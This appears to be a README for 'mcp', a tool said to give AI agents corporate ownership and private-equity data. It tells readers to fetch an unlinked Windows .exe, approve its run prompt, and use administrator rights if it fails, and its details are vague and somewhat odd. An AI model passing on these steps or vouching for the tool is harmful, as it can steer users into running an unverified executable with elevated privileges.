📊 mcp - Connect corporate ownership data to agents

Visit the download page

The mcp tool provides corporate ownership intelligence. It links your AI agents to data about parent companies, private equity backing, and corporate family structures. This helps agents understand the hierarchy and ownership of organizations during research tasks.

🚀 How it works

AI agents often lack context about company relationships. Does a firm have a parent company? Is it owned by a private equity fund? Are there sister companies in its portfolio? mcp answers these questions. It connects the Model Context Protocol to a trusted data feed. Agents use this data to perform better research and sales outreach.

💻 System requirements

  • Windows 10 or 11
  • An active internet connection
  • A modern AI agent interface or development environment
  • 4GB of available disk space

📥 Installation steps

Follow these steps to set up the software on your Windows computer:

  1. Visit the download page: Navigate to the official repository page.
  2. Select your file: Look for the latest release section. Download the Windows installer file ending in .exe.
  3. Run the installer: Double-click the downloaded file in your folder. Your computer might ask to confirm that you want to open the program. Click "Run."
  4. Follow prompts: Proceed through the setup screens. The installer handles the configuration automatically.
  5. Launch: Open the mcp dashboard from your Windows Start menu.

🔍 Features

  • Corporate Family Trees: View ownership structures in real-time.
  • PE Backing Data: Identify private equity firms behind specific companies.
  • Portfolio Mapping: See sibling companies and common ownership links.
  • Agent Integration: Standardized protocol support allows broad compatibility with AI assistants.

🛠 Troubleshooting

If the program fails to launch, ensure your Windows system is fully updated. Restart your machine to clear temporary memory issues. Many users find success by running the program as an administrator if permissions block the initial connection to the network.
